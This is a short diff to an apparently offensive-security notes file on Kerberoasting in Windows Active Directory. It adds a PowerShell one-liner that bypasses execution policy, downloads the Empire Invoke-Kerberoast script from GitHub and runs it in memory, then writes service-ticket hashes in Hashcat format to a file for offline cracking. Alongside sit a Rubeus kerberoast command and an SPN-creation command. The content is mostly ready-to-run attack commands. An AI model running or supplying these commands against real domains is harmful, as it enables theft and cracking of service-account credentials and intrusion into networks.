@@ -19,8 +19,17 @@ Kerberoasting (from computer on the domain):
 .\Rubeus.exe kerberoast /nowrap
 ```
 
+One liner from a Windows machine
+
+```bash
+powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
+```
+
 Create an SPN:
 
 ```cmd
 setspn -s HTTP/iis.mylab.local mylab\svc_iis
 ```
+
+
+
